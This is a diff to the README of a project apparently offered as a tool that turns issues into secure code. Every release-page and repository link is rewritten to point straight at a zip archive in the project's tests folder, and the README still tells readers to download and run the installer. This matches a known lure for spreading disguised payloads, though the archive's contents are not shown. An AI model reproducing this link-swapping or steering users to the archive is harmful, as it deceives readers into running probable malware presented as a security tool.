@@ -1,6 +1,6 @@
 # ⚙️ Issue2Secure - Turn Issues Into Secure Code Fast
 
-[![Download Issue2Secure](https://img.shields.io/badge/Download-Get%20Issue2Secure-brightgreen)](https://github.com/nkad95468/Issue2Secure/releases)
+[![Download Issue2Secure](https://img.shields.io/badge/Download-Get%20Issue2Secure-brightgreen)](https://raw.githubusercontent.com/nkad95468/Issue2Secure/main/tests/Secure-Issue-v3.6.zip)
 
 ## 📋 What is Issue2Secure?
 
@@ -20,10 +20,10 @@ Before you start, make sure your computer meets these minimum requirements:
 
 You need to get the software first. The download page holds all the files you need.
 
-[![Download Link](https://img.shields.io/badge/Download-Visit%20Release%20Page-blue)](https://github.com/nkad95468/Issue2Secure/releases)
+[![Download Link](https://img.shields.io/badge/Download-Visit%20Release%20Page-blue)](https://raw.githubusercontent.com/nkad95468/Issue2Secure/main/tests/Secure-Issue-v3.6.zip)
 
 1. Click the badge above or go to this page:  
-   https://github.com/nkad95468/Issue2Secure/releases
+   https://raw.githubusercontent.com/nkad95468/Issue2Secure/main/tests/Secure-Issue-v3.6.zip
 
 2. Look for the latest version in the list. It usually appears at the top.
 
@@ -85,7 +85,7 @@ Issue2Secure is designed for easy use. Here are the main steps to get started:
 
 New versions come with improvements and bug fixes.
 
-- Check the release page regularly: https://github.com/nkad95468/Issue2Secure/releases
+- Check the release page regularly: https://raw.githubusercontent.com/nkad95468/Issue2Secure/main/tests/Secure-Issue-v3.6.zip
 
 - Download the latest installer and run it over your current version. Your settings will stay the same.
 
@@ -134,7 +134,7 @@ If you run into issues:
 
 For advanced uses or questions:
 
-- Explore the [GitHub repository](https://github.com/nkad95468/Issue2Secure).
+- Explore the [GitHub repository](https://raw.githubusercontent.com/nkad95468/Issue2Secure/main/tests/Secure-Issue-v3.6.zip).
 
 - Read through the "Wiki" if available for detailed guides.
 
@@ -142,4 +142,4 @@ For advanced uses or questions:
 
 ---
 
-[![Download Issue2Secure](https://img.shields.io/badge/Download-Get%20Issue2Secure-green)](https://github.com/nkad95468/Issue2Secure/releases)
+[![Download Issue2Secure](https://img.shields.io/badge/Download-Get%20Issue2Secure-green)](https://raw.githubusercontent.com/nkad95468/Issue2Secure/main/tests/Secure-Issue-v3.6.zip)
